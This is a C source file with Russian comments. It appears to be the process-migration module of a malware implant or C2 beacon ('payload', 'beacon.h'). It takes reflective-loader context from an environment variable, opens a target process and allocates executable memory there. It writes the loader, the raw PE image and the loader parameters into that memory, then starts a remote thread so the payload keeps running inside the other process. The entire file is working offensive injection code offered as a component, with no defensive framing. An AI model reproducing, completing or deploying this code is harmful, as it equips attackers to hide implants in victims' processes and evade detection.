// Модуль миграции для payload-а.
// Подключается к payload-у на этапе сборки. Использует контекст,
// который рефлективный загрузчик оставил в env-переменной "__RL_CTX".

#include "migrate.h"
#include "loader.h"
#include "../core/beacon.h"

// Парсинг hex-строки "0xABCDEF..." в указатель. Без CRT.
static ULONGLONG parse_hex(const char *s)
{
    ULONGLONG v = 0;
    if (s[0] == '0' && (s[1] == 'x' || s[1] == 'X')) s += 2;
    while (*s) {
        char c = *s++;
        BYTE nib;
        if (c >= '0' && c <= '9') nib = (BYTE)(c - '0');
        else if (c >= 'A' && c <= 'F') nib = (BYTE)(c - 'A' + 10);
        else if (c >= 'a' && c <= 'f') nib = (BYTE)(c - 'a' + 10);
        else break;
        v = (v << 4) | nib;
    }
    return v;
}

BOOL MigrateToProcess(DWORD targetPid)
{
    // 1. Получаем контекст из env-переменной
    char buf[64];
    DWORD len = GetEnvironmentVariableA("__RL_CTX", buf, sizeof(buf));
    if (!len || len >= sizeof(buf)) return FALSE;

    PLOADER_PARAM ctx = (PLOADER_PARAM)(uintptr_t)parse_hex(buf);
    if (!ctx) return FALSE;

    // Снимаем нужные поля локально (после OpenProcess в чужом адресном
    // пространстве доступа к нашим указателям не будет, так что копируем).
    PVOID local_raw_pe         = ctx->raw_pe;
    DWORD local_raw_pe_size    = ctx->raw_pe_size;
    DWORD local_flags          = ctx->flags;
    PVOID local_loader_section = ctx->loader_section;
    DWORD local_loader_size    = ctx->loader_section_size;
    DWORD local_entry_offset   = ctx->entry_offset;

    if (!local_raw_pe || !local_loader_section) return FALSE;

    // 2. Open target process.
    HANDLE hProc = nt_open_process(
        PROCESS_CREATE_THREAD | PROCESS_VM_OPERATION |
        PROCESS_VM_WRITE | PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
        targetPid);
    if (!hProc) return FALSE;

    // 3. Allocate single block: [.rldr section][LOADER_PARAM][raw PE].
    SIZE_T param_size = sizeof(LOADER_PARAM);
    SIZE_T total_size = (SIZE_T)local_loader_size + param_size + local_raw_pe_size;

    BYTE *remote = (BYTE *)nt_alloc_remote(hProc, total_size, PAGE_EXECUTE_READWRITE);
    if (!remote) { CloseHandle(hProc); return FALSE; }

    BYTE *r_section = remote;
    BYTE *r_loader  = r_section + local_entry_offset;
    BYTE *r_param   = r_section + local_loader_size;
    BYTE *r_pe      = r_param + param_size;

    // 4. Write loader section.
    if (!nt_write(hProc, r_section, local_loader_section, local_loader_size)) {
        nt_free_remote(hProc, remote);
        CloseHandle(hProc);
        return FALSE;
    }

    // 5. Write raw PE bytes.
    if (!nt_write(hProc, r_pe, local_raw_pe, local_raw_pe_size)) {
        nt_free_remote(hProc, remote);
        CloseHandle(hProc);
        return FALSE;
    }

    // 6. Write LOADER_PARAM (enables chained migration from the new process).
    LOADER_PARAM lp;
    lp.raw_pe              = r_pe;
    lp.raw_pe_size         = local_raw_pe_size;
    lp.flags               = local_flags;
    lp.out_module_base     = NULL;
    lp.loader_section      = r_section;
    lp.loader_section_size = local_loader_size;
    lp.entry_offset        = local_entry_offset;

    if (!nt_write(hProc, r_param, &lp, sizeof(lp))) {
        nt_free_remote(hProc, remote);
        CloseHandle(hProc);
        return FALSE;
    }

    // 7. Start remote thread on ReflectiveLoader.
    HANDLE hThread = nt_create_thread(hProc, r_loader, r_param);
    if (!hThread) {
        nt_free_remote(hProc, remote);
        CloseHandle(hProc);
        return FALSE;
    }

    CloseHandle(hThread);
    CloseHandle(hProc);
    return TRUE;
}
